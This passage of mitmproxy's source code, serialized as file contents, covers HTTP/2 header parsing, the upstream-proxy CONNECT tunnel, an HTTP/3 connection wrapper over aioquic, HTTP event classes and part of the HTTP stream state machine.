timestamp_start=time.time(),\n                timestamp_end=None,\n            )\n            self.streams[event.stream_id] = StreamState.HEADERS_RECEIVED\n            yield ReceiveHttp(\n                ResponseHeaders(event.stream_id, response, bool(event.stream_ended))\n            )\n            return False\n        elif isinstance(event, h2.events.InformationalResponseReceived):\n            # We violate the spec here (\"A proxy MUST forward 1xx responses\", RFC 7231),\n            # but that's probably fine:\n            # - 100 Continue is sent by mitmproxy to clients (irrespective of what the server does).\n            # - 101 Switching Protocols is not allowed for HTTP/2.\n            # - 102 Processing is WebDAV only and also ignorable.\n            # - 103 Early Hints is not mission-critical.\n            headers = http.Headers(event.headers)\n            status: str | int = \"<unknown status>\"\n            try:\n                status = int(headers[\":status\"])\n                reason = status_codes.RESPONSES.get(status, \"\")\n            except (KeyError, ValueError):\n                reason = \"\"\n            yield Log(f\"Swallowing HTTP/2 informational response: {status} {reason}\")\n            return False\n        elif isinstance(event, h2.events.RequestReceived):\n            yield from self.protocol_error(\n                f\"HTTP/2 protocol error: received request from server\"\n            )\n            return True\n        elif isinstance(event, h2.events.RemoteSettingsChanged):\n            # We have received at least one settings from now,\n            # which means we can rely on the max concurrency in remote_settings\n            self.provisional_max_concurrency = None\n            return (yield from super().handle_h2_event(event))\n        else:\n            return (yield from super().handle_h2_event(event))\n\n\ndef split_pseudo_headers(\n    h2_headers: Sequence[tuple[bytes, bytes]],\n) -> tuple[dict[bytes, bytes], http.Headers]:\n    pseudo_headers: dict[bytes, bytes] = {}\n    i = 0\n    for header, value in h2_headers:\n        if header.startswith(b\":\"):\n            if header in pseudo_headers:\n                raise ValueError(f\"Duplicate HTTP/2 pseudo header: {header!r}\")\n            pseudo_headers[header] = value\n            i += 1\n        else:\n            # Pseudo-headers must be at the start, we are done here.\n            break\n\n    headers = http.Headers(h2_headers[i:])\n\n    return pseudo_headers, headers\n\n\ndef parse_h2_request_headers(\n    h2_headers: Sequence[tuple[bytes, bytes]],\n) -> tuple[str, int, bytes, bytes, bytes, bytes, http.Headers]:\n    \"\"\"Split HTTP/2 pseudo-headers from the actual headers and parse them.\"\"\"\n    pseudo_headers, headers = split_pseudo_headers(h2_headers)\n\n    try:\n        method: bytes = pseudo_headers.pop(b\":method\")\n        scheme: bytes = pseudo_headers.pop(\n            b\":scheme\"\n        )  # this raises for HTTP/2 CONNECT requests\n        path: bytes = pseudo_headers.pop(b\":path\")\n        authority: bytes = pseudo_headers.pop(b\":authority\", b\"\")\n    except KeyError as e:\n        raise ValueError(f\"Required pseudo header is missing: {e}\")\n\n    if pseudo_headers:\n        raise ValueError(f\"Unknown pseudo headers: {pseudo_headers}\")\n\n    if authority:\n        host, port = url.parse_authority(authority, check=True)\n        if port is None:\n            port = 80 if scheme == b\"http\" else 443\n    else:\n        host = \"\"\n        port = 0\n\n    return host, port, method, scheme, authority, path, headers\n\n\ndef parse_h2_response_headers(\n    h2_headers: Sequence[tuple[bytes, bytes]],\n) -> tuple[int, http.Headers]:\n    \"\"\"Split HTTP/2 pseudo-headers from the actual headers and parse them.\"\"\"\n    pseudo_headers, headers = split_pseudo_headers(h2_headers)\n\n    try:\n        status_code: int = int(pseudo_headers.pop(b\":status\"))\n    except KeyError as e:\n        raise ValueError(f\"Required pseudo header is missing: {e}\")\n\n    if pseudo_headers:\n        raise ValueError(f\"Unknown pseudo headers: {pseudo_headers}\")\n\n    return status_code, headers\n\n\n__all__ = [\n    \"format_h2_request_headers\",\n    \"format_h2_response_headers\",\n    \"parse_h2_request_headers\",\n    \"parse_h2_response_headers\",\n    \"Http2Client\",\n    \"Http2Server\",\n]\n", "mitmproxy/proxy/layers/http/_upstream_proxy.py": "import time\nfrom logging import DEBUG\n\nfrom h11._receivebuffer import ReceiveBuffer\n\nfrom mitmproxy import connection\nfrom mitmproxy import http\nfrom mitmproxy.net.http import http1\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import context\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy import tunnel\nfrom mitmproxy.proxy.layers import tls\nfrom mitmproxy.proxy.layers.http._hooks import HttpConnectUpstreamHook\nfrom mitmproxy.utils import human\n\n\nclass HttpUpstreamProxy(tunnel.TunnelLayer):\n    buf: ReceiveBuffer\n    send_connect: bool\n    conn: connection.Server\n    tunnel_connection: connection.Server\n\n    def __init__(\n        self, ctx: context.Context, tunnel_conn: connection.Server, send_connect: bool\n    ):\n        super().__init__(ctx, tunnel_connection=tunnel_conn, conn=ctx.server)\n        self.buf = ReceiveBuffer()\n        self.send_connect = send_connect\n\n    @classmethod\n    def make(cls, ctx: context.Context, send_connect: bool) -> tunnel.LayerStack:\n        assert ctx.server.via\n        scheme, address = ctx.server.via\n        assert scheme in (\"http\", \"https\")\n\n        http_proxy = connection.Server(address=address)\n\n        stack = tunnel.LayerStack()\n        if scheme == \"https\":\n            http_proxy.alpn_offers = tls.HTTP1_ALPNS\n            http_proxy.sni = address[0]\n            stack /= tls.ServerTLSLayer(ctx, http_proxy)\n        stack /= cls(ctx, http_proxy, send_connect)\n\n        return stack\n\n    def start_handshake(self) -> layer.CommandGenerator[None]:\n        if not self.send_connect:\n            return (yield from super().start_handshake())\n        assert self.conn.address\n        flow = http.HTTPFlow(self.context.client, self.tunnel_connection)\n        authority = (\n            self.conn.address[0].encode(\"idna\") + f\":{self.conn.address[1]}\".encode()\n        )\n        flow.request = http.Request(\n            host=self.conn.address[0],\n            port=self.conn.address[1],\n            method=b\"CONNECT\",\n            scheme=b\"\",\n            authority=authority,\n            path=b\"\",\n            http_version=b\"HTTP/1.1\",\n            headers=http.Headers(),\n            content=b\"\",\n            trailers=None,\n            timestamp_start=time.time(),\n            timestamp_end=time.time(),\n        )\n        yield HttpConnectUpstreamHook(flow)\n        raw = http1.assemble_request(flow.request)\n        yield commands.SendData(self.tunnel_connection, raw)\n\n    def receive_handshake_data(\n        self, data: bytes\n    ) -> layer.CommandGenerator[tuple[bool, str | None]]:\n        if not self.send_connect:\n            return (yield from super().receive_handshake_data(data))\n        self.buf += data\n        response_head = self.buf.maybe_extract_lines()\n        if response_head:\n            try:\n                response = http1.read_response_head([bytes(x) for x in response_head])\n            except ValueError as e:\n                proxyaddr = human.format_address(self.tunnel_connection.address)\n                yield commands.Log(f\"{proxyaddr}: {e}\")\n                return False, f\"Error connecting to {proxyaddr}: {e}\"\n            if 200 <= response.status_code < 300:\n                if self.buf:\n                    yield from self.receive_data(bytes(self.buf))\n                    del self.buf\n                return True, None\n            else:\n                proxyaddr = human.format_address(self.tunnel_connection.address)\n                raw_resp = b\"\\n\".join(response_head)\n                yield commands.Log(f\"{proxyaddr}: {raw_resp!r}\", DEBUG)\n                return (\n                    False,\n                    f\"Upstream proxy {proxyaddr} refused HTTP CONNECT request: {response.status_code} {response.reason}\",\n                )\n        else:\n            return False, None\n", "mitmproxy/proxy/layers/http/_http_h3.py": "from collections.abc import Iterable\nfrom dataclasses import dataclass\n\nfrom aioquic.h3.connection import FrameUnexpected\nfrom aioquic.h3.connection import H3Connection\nfrom aioquic.h3.connection import H3Event\nfrom aioquic.h3.connection import H3Stream\nfrom aioquic.h3.connection import Headers\nfrom aioquic.h3.connection import HeadersState\nfrom aioquic.h3.connection import StreamType\nfrom aioquic.h3.events import HeadersReceived\nfrom aioquic.quic.configuration import QuicConfiguration\nfrom aioquic.quic.events import StreamDataReceived\nfrom aioquic.quic.packet import QuicErrorCode\n\nfrom mitmproxy import connection\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.layers.quic import CloseQuicConnection\nfrom mitmproxy.proxy.layers.quic import QuicConnectionClosed\nfrom mitmproxy.proxy.layers.quic import QuicStreamDataReceived\nfrom mitmproxy.proxy.layers.quic import QuicStreamEvent\nfrom mitmproxy.proxy.layers.quic import QuicStreamReset\nfrom mitmproxy.proxy.layers.quic import ResetQuicStream\nfrom mitmproxy.proxy.layers.quic import SendQuicStreamData\n\n\n@dataclass\nclass TrailersReceived(H3Event):\n    \"\"\"\n    The TrailersReceived event is fired whenever trailers are received.\n    \"\"\"\n\n    trailers: Headers\n    \"The trailers.\"\n\n    stream_id: int\n    \"The ID of the stream the trailers were received for.\"\n\n    stream_ended: bool\n    \"Whether the STREAM frame had the FIN bit set.\"\n\n    push_id: int | None = None\n    \"The Push ID or `None` if this is not a push.\"\n\n\n@dataclass\nclass StreamReset(H3Event):\n    \"\"\"\n    The StreamReset event is fired whenever a stream is reset by the peer.\n    \"\"\"\n\n    stream_id: int\n    \"The ID of the stream that was reset.\"\n\n    error_code: int\n    \"\"\"The error code indicating why the stream was reset.\"\"\"\n\n    push_id: int | None = None\n    \"The Push ID or `None` if this is not a push.\"\n\n\nclass MockQuic:\n    \"\"\"\n    aioquic intermingles QUIC and HTTP/3. This is something we don't want to do because that makes testing much harder.\n    Instead, we mock our QUIC connection object here and then take out the wire data to be sent.\n    \"\"\"\n\n    def __init__(self, conn: connection.Connection, is_client: bool) -> None:\n        self.conn = conn\n        self.pending_commands: list[commands.Command] = []\n        self._next_stream_id: list[int] = [0, 1, 2, 3]\n        self._is_client = is_client\n\n        # the following fields are accessed by H3Connection\n        self.configuration = QuicConfiguration(is_client=is_client)\n        self._quic_logger = None\n        self._remote_max_datagram_frame_size = 0\n\n    def close(\n        self,\n        error_code: int = QuicErrorCode.NO_ERROR,\n        frame_type: int | None = None,\n        reason_phrase: str = \"\",\n    ) -> None:\n        # we'll get closed if a protocol error occurs in `H3Connection.handle_event`\n        # we note the error on the connection and yield a CloseConnection\n        # this will then call `QuicConnection.close` with the proper values\n        # once the `Http3Connection` receives `ConnectionClosed`, it will send out `ProtocolError`\n        self.pending_commands.append(\n            CloseQuicConnection(self.conn, error_code, frame_type, reason_phrase)\n        )\n\n    def get_next_available_stream_id(self, is_unidirectional: bool = False) -> int:\n        # since we always reserve the ID, we have to \"find\" the next ID like `QuicConnection` does\n        index = (int(is_unidirectional) << 1) | int(not self._is_client)\n        stream_id = self._next_stream_id[index]\n        self._next_stream_id[index] = stream_id + 4\n        return stream_id\n\n    def reset_stream(self, stream_id: int, error_code: int) -> None:\n        self.pending_commands.append(ResetQuicStream(self.conn, stream_id, error_code))\n\n    def send_stream_data(\n        self, stream_id: int, data: bytes, end_stream: bool = False\n    ) -> None:\n        self.pending_commands.append(\n            SendQuicStreamData(self.conn, stream_id, data, end_stream)\n        )\n\n\nclass LayeredH3Connection(H3Connection):\n    \"\"\"\n    Creates a H3 connection using a fake QUIC connection, which allows layer separation.\n    Also ensures that headers, data and trailers are sent in that order.\n    \"\"\"\n\n    def __init__(\n        self,\n        conn: connection.Connection,\n        is_client: bool,\n        enable_webtransport: bool = False,\n    ) -> None:\n        self._mock = MockQuic(conn, is_client)\n        super().__init__(self._mock, enable_webtransport)  # type: ignore\n\n    def _after_send(self, stream_id: int, end_stream: bool) -> None:\n        # if the stream ended, `QuicConnection` has an assert that no further data is being sent\n        # to catch this more early on, we set the header state on the `H3Stream`\n        if end_stream:\n            self._stream[stream_id].headers_send_state = HeadersState.AFTER_TRAILERS\n\n    def _handle_request_or_push_frame(\n        self,\n        frame_type: int,\n        frame_data: bytes | None,\n        stream: H3Stream,\n        stream_ended: bool,\n    ) -> list[H3Event]:\n        # turn HeadersReceived into TrailersReceived for trailers\n        events = super()._handle_request_or_push_frame(\n            frame_type, frame_data, stream, stream_ended\n        )\n        for index, event in enumerate(events):\n            if (\n                isinstance(event, HeadersReceived)\n                and self._stream[event.stream_id].headers_recv_state\n                == HeadersState.AFTER_TRAILERS\n            ):\n                events[index] = TrailersReceived(\n                    event.headers, event.stream_id, event.stream_ended, event.push_id\n                )\n        return events\n\n    def close_connection(\n        self,\n        error_code: int = QuicErrorCode.NO_ERROR,\n        frame_type: int | None = None,\n        reason_phrase: str = \"\",\n    ) -> None:\n        \"\"\"Closes the underlying QUIC connection and ignores any incoming events.\"\"\"\n\n        self._is_done = True\n        self._quic.close(error_code, frame_type, reason_phrase)\n\n    def end_stream(self, stream_id: int) -> None:\n        \"\"\"Ends the given stream if not already done so.\"\"\"\n\n        stream = self._get_or_create_stream(stream_id)\n        if stream.headers_send_state != HeadersState.AFTER_TRAILERS:\n            super().send_data(stream_id, b\"\", end_stream=True)\n            stream.headers_send_state = HeadersState.AFTER_TRAILERS\n\n    def get_next_available_stream_id(self, is_unidirectional: bool = False):\n        \"\"\"Reserves and returns the next available stream ID.\"\"\"\n\n        return self._quic.get_next_available_stream_id(is_unidirectional)\n\n    def get_open_stream_ids(self, push_id: int | None) -> Iterable[int]:\n        \"\"\"Iterates over all non-special open streams, optionally for a given push id.\"\"\"\n\n        return (\n            stream.stream_id\n            for stream in self._stream.values()\n            if (\n                stream.push_id == push_id\n                and stream.stream_type == (None if push_id is None else StreamType.PUSH)\n                and not (\n                    stream.headers_recv_state == HeadersState.AFTER_TRAILERS\n                    and stream.headers_send_state == HeadersState.AFTER_TRAILERS\n                )\n            )\n        )\n\n    def handle_connection_closed(self, event: QuicConnectionClosed) -> None:\n        self._is_done = True\n\n    def handle_stream_event(self, event: QuicStreamEvent) -> list[H3Event]:\n        # don't do anything if we're done\n        if self._is_done:\n            return []\n\n        # treat reset events similar to data events with end_stream=True\n        # We can receive multiple reset events as long as the final size does not change.\n        elif isinstance(event, QuicStreamReset):\n            stream = self._get_or_create_stream(event.stream_id)\n            stream.ended = True\n            stream.headers_recv_state = HeadersState.AFTER_TRAILERS\n            return [StreamReset(event.stream_id, event.error_code, stream.push_id)]\n\n        # convert data events from the QUIC layer back to aioquic events\n        elif isinstance(event, QuicStreamDataReceived):\n            if self._get_or_create_stream(event.stream_id).ended:\n                # aioquic will not send us any data events once a stream has ended.\n                # Instead, it will close the connection. We simulate this here for H3 tests.\n                self.close_connection(\n                    error_code=QuicErrorCode.PROTOCOL_VIOLATION,\n                    reason_phrase=\"stream already ended\",\n                )\n                return []\n            else:\n                return self.handle_event(\n                    StreamDataReceived(event.data, event.end_stream, event.stream_id)\n                )\n\n        # should never happen\n        else:  # pragma: no cover\n            raise AssertionError(f\"Unexpected event: {event!r}\")\n\n    def has_sent_headers(self, stream_id: int) -> bool:\n        \"\"\"Indicates whether headers have been sent over the given stream.\"\"\"\n\n        try:\n            return self._stream[stream_id].headers_send_state != HeadersState.INITIAL\n        except KeyError:\n            return False\n\n    def reset_stream(self, stream_id: int, error_code: int) -> None:\n        \"\"\"Resets a stream that hasn't been ended locally yet.\"\"\"\n\n        # set the header state and queue a reset event\n        stream = self._get_or_create_stream(stream_id)\n        stream.headers_send_state = HeadersState.AFTER_TRAILERS\n        self._quic.reset_stream(stream_id, error_code)\n\n    def send_data(self, stream_id: int, data: bytes, end_stream: bool = False) -> None:\n        \"\"\"Sends data over the given stream.\"\"\"\n\n        super().send_data(stream_id, data, end_stream)\n        self._after_send(stream_id, end_stream)\n\n    def send_datagram(self, flow_id: int, data: bytes) -> None:\n        # supporting datagrams would require additional information from the underlying QUIC connection\n        raise NotImplementedError()  # pragma: no cover\n\n    def send_headers(\n        self, stream_id: int, headers: Headers, end_stream: bool = False\n    ) -> None:\n        \"\"\"Sends headers over the given stream.\"\"\"\n\n        # ensure we haven't sent something before\n        stream = self._get_or_create_stream(stream_id)\n        if stream.headers_send_state != HeadersState.INITIAL:\n            raise FrameUnexpected(\"initial HEADERS frame is not allowed in this state\")\n        super().send_headers(stream_id, headers, end_stream)\n        self._after_send(stream_id, end_stream)\n\n    def send_trailers(self, stream_id: int, trailers: Headers) -> None:\n        \"\"\"Sends trailers over the given stream and ends it.\"\"\"\n\n        # ensure we got some headers first\n        stream = self._get_or_create_stream(stream_id)\n        if stream.headers_send_state != HeadersState.AFTER_HEADERS:\n            raise FrameUnexpected(\"trailing HEADERS frame is not allowed in this state\")\n        super().send_headers(stream_id, trailers, end_stream=True)\n        self._after_send(stream_id, end_stream=True)\n\n    def transmit(self) -> layer.CommandGenerator[None]:\n        \"\"\"Yields all pending commands for the upper QUIC layer.\"\"\"\n\n        while self._mock.pending_commands:\n            yield self._mock.pending_commands.pop(0)\n\n\n__all__ = [\n    \"LayeredH3Connection\",\n    \"StreamReset\",\n    \"TrailersReceived\",\n]\n", "mitmproxy/proxy/layers/http/_events.py": "from dataclasses import dataclass\n\nfrom ._base import HttpEvent\nfrom mitmproxy import http\nfrom mitmproxy.http import HTTPFlow\n\n\n@dataclass\nclass RequestHeaders(HttpEvent):\n    request: http.Request\n    end_stream: bool\n    \"\"\"\n    If True, we already know at this point that there is no message body. This is useful for HTTP/2, where it allows\n    us to set END_STREAM on headers already (and some servers - Akamai - implicitly expect that).\n    In either case, this event will nonetheless be followed by RequestEndOfMessage.\n    \"\"\"\n    replay_flow: HTTPFlow | None = None\n    \"\"\"If set, the current request headers belong to a replayed flow, which should be reused.\"\"\"\n\n\n@dataclass\nclass ResponseHeaders(HttpEvent):\n    response: http.Response\n    end_stream: bool = False\n\n\n# explicit constructors below to facilitate type checking in _http1/_http2\n\n\n@dataclass\nclass RequestData(HttpEvent):\n    data: bytes\n\n    def __init__(self, stream_id: int, data: bytes):\n        self.stream_id = stream_id\n        self.data = data\n\n\n@dataclass\nclass ResponseData(HttpEvent):\n    data: bytes\n\n    def __init__(self, stream_id: int, data: bytes):\n        self.stream_id = stream_id\n        self.data = data\n\n\n@dataclass\nclass RequestTrailers(HttpEvent):\n    trailers: http.Headers\n\n    def __init__(self, stream_id: int, trailers: http.Headers):\n        self.stream_id = stream_id\n        self.trailers = trailers\n\n\n@dataclass\nclass ResponseTrailers(HttpEvent):\n    trailers: http.Headers\n\n    def __init__(self, stream_id: int, trailers: http.Headers):\n        self.stream_id = stream_id\n        self.trailers = trailers\n\n\n@dataclass\nclass RequestEndOfMessage(HttpEvent):\n    def __init__(self, stream_id: int):\n        self.stream_id = stream_id\n\n\n@dataclass\nclass ResponseEndOfMessage(HttpEvent):\n    def __init__(self, stream_id: int):\n        self.stream_id = stream_id\n\n\n@dataclass\nclass RequestProtocolError(HttpEvent):\n    message: str\n    code: int = 400\n\n    def __init__(self, stream_id: int, message: str, code: int = 400):\n        self.stream_id = stream_id\n        self.message = message\n        self.code = code\n\n\n@dataclass\nclass ResponseProtocolError(HttpEvent):\n    message: str\n    code: int = 502\n\n    def __init__(self, stream_id: int, message: str, code: int = 502):\n        self.stream_id = stream_id\n        self.message = message\n        self.code = code\n\n\n__all__ = [\n    \"HttpEvent\",\n    \"RequestHeaders\",\n    \"RequestData\",\n    \"RequestEndOfMessage\",\n    \"ResponseHeaders\",\n    \"ResponseData\",\n    \"RequestTrailers\",\n    \"ResponseTrailers\",\n    \"ResponseEndOfMessage\",\n    \"RequestProtocolError\",\n    \"ResponseProtocolError\",\n]\n", "mitmproxy/proxy/layers/http/__init__.py": "import collections\nimport enum\nimport time\nfrom dataclasses import dataclass\nfrom functools import cached_property\nfrom logging import DEBUG\nfrom logging import WARNING\n\nimport wsproto.handshake\n\nfrom ...context import Context\nfrom ...mode_specs import ReverseMode\nfrom ...mode_specs import UpstreamMode\nfrom ..quic import QuicStreamEvent\nfrom ._base import HttpCommand\nfrom ._base import HttpConnection\nfrom ._base import ReceiveHttp\nfrom ._base import StreamId\nfrom ._events import HttpEvent\nfrom ._events import RequestData\nfrom ._events import RequestEndOfMessage\nfrom ._events import RequestHeaders\nfrom ._events import RequestProtocolError\nfrom ._events import RequestTrailers\nfrom ._events import ResponseData\nfrom ._events import ResponseEndOfMessage\nfrom ._events import ResponseHeaders\nfrom ._events import ResponseProtocolError\nfrom ._events import ResponseTrailers\nfrom ._hooks import HttpConnectedHook\nfrom ._hooks import HttpConnectErrorHook\nfrom ._hooks import HttpConnectHook\nfrom ._hooks import HttpErrorHook\nfrom ._hooks import HttpRequestHeadersHook\nfrom ._hooks import HttpRequestHook\nfrom ._hooks import HttpResponseHeadersHook\nfrom ._hooks import HttpResponseHook\nfrom ._http1 import Http1Client\nfrom ._http1 import Http1Connection\nfrom ._http1 import Http1Server\nfrom ._http2 import Http2Client\nfrom ._http2 import Http2Server\nfrom ._http3 import Http3Client\nfrom ._http3 import Http3Server\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.connection import Server\nfrom mitmproxy.connection import TransportProtocol\nfrom mitmproxy.net import server_spec\nfrom mitmproxy.net.http import status_codes\nfrom mitmproxy.net.http import url\nfrom mitmproxy.net.http.http1 import expected_http_body_size\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy import tunnel\nfrom mitmproxy.proxy.layers import quic\nfrom mitmproxy.proxy.layers import tcp\nfrom mitmproxy.proxy.layers import tls\nfrom mitmproxy.proxy.layers import websocket\nfrom mitmproxy.proxy.layers.http import _upstream_proxy\nfrom mitmproxy.proxy.utils import expect\nfrom mitmproxy.proxy.utils import ReceiveBuffer\nfrom mitmproxy.utils import human\nfrom mitmproxy.websocket import WebSocketData\n\n\nclass HTTPMode(enum.Enum):\n    regular = 1\n    transparent = 2\n    upstream = 3\n\n\ndef validate_request(mode: HTTPMode, request: http.Request) -> str | None:\n    if request.scheme not in (\"http\", \"https\", \"\"):\n        return f\"Invalid request scheme: {request.scheme}\"\n    if mode is HTTPMode.transparent and request.method == \"CONNECT\":\n        return (\n            f\"mitmproxy received an HTTP CONNECT request even though it is not running in regular/upstream mode. \"\n            f\"This usually indicates a misconfiguration, please see the mitmproxy mode documentation for details.\"\n        )\n    return None\n\n\ndef is_h3_alpn(alpn: bytes | None) -> bool:\n    return alpn == b\"h3\" or (alpn is not None and alpn.startswith(b\"h3-\"))\n\n\n@dataclass\nclass GetHttpConnection(HttpCommand):\n    \"\"\"\n    Open an HTTP Connection. This may not actually open a connection, but return an existing HTTP connection instead.\n    \"\"\"\n\n    blocking = True\n    address: tuple[str, int]\n    tls: bool\n    via: server_spec.ServerSpec | None\n    transport_protocol: TransportProtocol = \"tcp\"\n\n    def __hash__(self):\n        return id(self)\n\n    def connection_spec_matches(self, connection: Connection) -> bool:\n        return (\n            isinstance(connection, Server)\n            and self.address == connection.address\n            and self.tls == connection.tls\n            and self.via == connection.via\n            and self.transport_protocol == connection.transport_protocol\n        )\n\n\n@dataclass\nclass GetHttpConnectionCompleted(events.CommandCompleted):\n    command: GetHttpConnection\n    reply: tuple[None, str] | tuple[Connection, None]\n    \"\"\"connection object, error message\"\"\"\n\n\n@dataclass\nclass RegisterHttpConnection(HttpCommand):\n    \"\"\"\n    Register that a HTTP connection attempt has been completed.\n    \"\"\"\n\n    connection: Connection\n    err: str | None\n\n\n@dataclass\nclass SendHttp(HttpCommand):\n    event: HttpEvent\n    connection: Connection\n\n    def __repr__(self) -> str:\n        return f\"Send({self.event})\"\n\n\n@dataclass\nclass DropStream(HttpCommand):\n    \"\"\"Signal to the HTTP layer that this stream is done processing and can be dropped from memory.\"\"\"\n\n    stream_id: StreamId\n\n\nclass HttpStream(layer.Layer):\n    request_body_buf: ReceiveBuffer\n    response_body_buf: ReceiveBuffer\n    flow: http.HTTPFlow\n    stream_id: StreamId\n    child_layer: layer.Layer | None = None\n\n    @cached_property\n    def mode(self) -> HTTPMode:\n        i = self.context.layers.index(self)\n        parent = self.context.layers[i - 1]\n        assert isinstance(parent, HttpLayer)\n        return parent.mode\n\n    def __init__(self, context: Context, stream_id: int) -> None:\n        super().__init__(context)\n        self.request_body_buf = ReceiveBuffer()\n        self.response_body_buf = ReceiveBuffer()\n        self.client_state = self.state_uninitialized\n        self.server_state = self.state_uninitialized\n        self.stream_id = stream_id\n\n    def __repr__(self):\n        if self._handle_event == self.passthrough:\n            return f\"HttpStream(id={self.stream_id}, passthrough)\"\n        else:\n            return (\n                f\"HttpStream(\"\n                f\"id={self.stream_id}, \"\n                f\"client_state={self.client_state.__name__}, \"\n                f\"server_state={self.server_state.__name__}\"\n                f\")\"\n            )\n\n    @expect(events.Start, HttpEvent)\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if isinstance(event, events.Start):\n            self.client_state = self.state_wait_for_request_headers\n        elif isinstance(event, (RequestProtocolError, ResponseProtocolError)):\n            yield from self.handle_protocol_error(event)\n        elif isinstance(\n            event, (RequestHeaders, RequestData, RequestTrailers, RequestEndOfMessage)\n        ):\n            yield from self.client_state(event)\n        else:\n            yield from self.server_state(event)\n\n    @expect(RequestHeaders)\n    def state_wait_for_request_headers(\n        self, event: RequestHeaders\n    ) -> layer.CommandGenerator[None]:\n        if not event.replay_flow:\n            self.flow = http.HTTPFlow(self.context.client, self.context.server)\n\n        else:\n            self.flow = event.replay_flow\n        self.flow.request = event.request\n        self.flow.live = True\n\n        if err := validate_request(self.mode, self.flow.request):\n            self.flow.response = http.Response.make(502, str(err))\n            self.client_state = self.state_errored\n            return (yield from self.send_response())\n\n        if self.flow.request.method == \"CONNECT\":\n            return (yield from self.handle_connect())\n\n        if self.mode is HTTPMode.transparent:\n            # Determine .scheme, .host and .port attributes for transparent requests\n            assert self.context.server.address\n            self.flow.request.data.host = self.context.server.address[0]\n            self.flow.request.data.port = self.context.server.address[1]\n            self.flow.request.scheme = \"https\" if self.context.server.tls else \"http\"\n        elif not self.flow.request.host:\n            # We need to extract destination information from the host header.\n            try:\n                host, port = url.parse_authority(\n                    self.flow.request.host_header or \"\", check=True\n                )\n            except ValueError:\n                yield SendHttp(\n                    ResponseProtocolError(\n                        self.stream_id,\n                        \"HTTP request has no host header, destination unknown.\",\n                        400,\n                    ),\n                    self.context.client,\n                )\n                self.client_state = self.state_errored\n                return\n            else:\n                if port is None:\n                    port = 443 if self.context.client.tls else 80\n                self.flow.request.data.host = host\n                self.flow.request.data.port = port\n                self.flow.request.scheme = (\n                    \"https\" if self.context.client.tls else \"http\"\n                )\n\n        if self.mode is HTTPMode.regular and not (\n            self.flow.request.is_http2 or self.flow.request.is_http3\n        ):\n            # Set the request target to origin-form for HTTP/1, some servers don't support absolute-form requests.\n            # see https://github.com/mitmproxy/mitmproxy/issues/1759\n            self.flow.request.authority = \"\"\n\n        # update host header in reverse proxy mode\n        if (\n            isinstance(self.context.client.proxy_mode, ReverseMode)\n            and not self.context.options.keep_host_header\n        ):\n            assert self.context.server.address\n            self.flow.request.host_header = url.hostport(\n                \"https\" if self.context.server.tls else \"http\",\n                self.context.server.address[0],\n                self.context.server.address[1],\n            )\n\n        if not event.end_stream and (yield from self.check_body_size(True)):\n            return\n\n        yield HttpRequestHeadersHook(self.flow)\n        if (yield from self.check_killed(True)):\n            return\n\n        if self.flow.request.headers.get(\"expect\", \"\").lower() == \"100-continue\":\n            continue_response = http.Response.make(100)\n            continue_response.headers.clear()\n            yield SendHttp(\n                ResponseHeaders(self.stream_id, continue_response), self.context.client\n            )\n            self.flow.request.headers.pop(\"expect\")\n\n        if self.flow.request.stream:\n            yield from self.start_request_stream()\n        else:\n            self.client_state = self.state_consume_request_body\n        self.server_state = self.state_wait_for_response_headers\n\n    def start_request_stream(self) -> layer.CommandGenerator[None]:\n        if self.flow.response:\n            raise NotImplementedError(\n                \"Can't set a response and enable streaming at the same time.\"\n            )\n        ok = yield from self.make_server_connection()\n        if not ok:\n            self.client_state = self.state_errored\n            return\n        yield SendHttp(\n            RequestHeaders(self.stream_id, self.flow.request, end_stream=False),\n            self.context.server,\n        )\n        yield commands.Log(f\"Streaming request to {self.flow.request.host}.\")\n        self.client_state = self.state_stream_request_body\n\n    @expect(RequestData, RequestTrailers, RequestEndOfMessage)\n    def state_stream_request_body(\n        self, event: RequestData | RequestEndOfMessage\n    ) -> layer.CommandGenerator[None]:\n        if isinstance(event, RequestData):\n            if callable(self.flow.request.stream):\n                chunks = self.flow.request.stream(event.data)\n                if isinstance(chunks, bytes):\n                    chunks = [chunks]\n            else:\n                chunks = [event.data]\n            for chunk in chunks:\n                yield SendHttp(RequestData(self.stream_id, chunk), self.context.server)\n        elif isinstance(event, RequestTrailers):\n            # we don't do anything further here, we wait for RequestEndOfMessage first to trigger the request hook.\n            self.flow.request.trailers = event.trailers\n        elif isinstance(event, RequestEndOfMessage):\n            if callable(self.flow.request.stream):\n                chunks = self.flow.request.stream(b\"\")\n                if chunks == b\"\":\n                    chunks = []\n                elif isinstance(chunks, bytes):\n                    chunks = [chunks]\n                for chunk in chunks:\n                    yield SendHttp(\n                        RequestData(self.stream_id, chunk), self.context.server\n                    )\n\n            self.flow.request.timestamp_end = time.time()\n            yield HttpRequestHook(self.flow)\n            self.client_state = self.state_done\n\n            if self.flow.request.trailers:\n                # we've delayed sending trailers until after `request` has been triggered.\n                yield SendHttp(\n                    RequestTrailers(self.stream_id, self.flow.request.trailers),\n                    self.context.server,\n                )\n            yield SendHttp(event, self.context.server)\n\n            if self.server_state == self.state_done:\n                yield from self.flow_done()\n\n    @expect(RequestData, RequestTrailers, RequestEndOfMessage)\n    def state_consume_request_body(\n        self, event: events.Event\n    ) -> layer.CommandGenerator[None]:\n        if isinstance(event, RequestData):\n            self.request_body_buf += event.data\n            yield from self.check_body_size(True)\n        elif isinstance(event, RequestTrailers):\n            assert self.flow.request\n            self.flow.request.trailers = event.trailers\n        elif isinstance(event, RequestEndOfMessage):\n            self.flow.request.timestamp_end = time.time()\n            self.flow.request.data.content = bytes(self.request_body_buf)\n            self.request_body_buf.clear()\n            self.client_state = self.state_done\n            yield HttpRequestHook(self.flow)\n            if (yield from self.check_killed(True)):\n                return\n            elif self.flow.response:\n                # response was set by an inline script.\n                # we now need to emulate the responseheaders hook.\n                self.flow.response.timestamp_start = time.time()\n                yield HttpResponseHeadersHook(self.flow)\n                if (yield from self.check_killed(True)):\n                    return\n                yield from self.send_response()\n            else:\n                ok = yield from self.make_server_connection()\n                if not ok:\n                    return\n\n                content = self.flow.request.raw_content\n                done_after_headers = not (content or self.flow.request.trailers)\n                yield 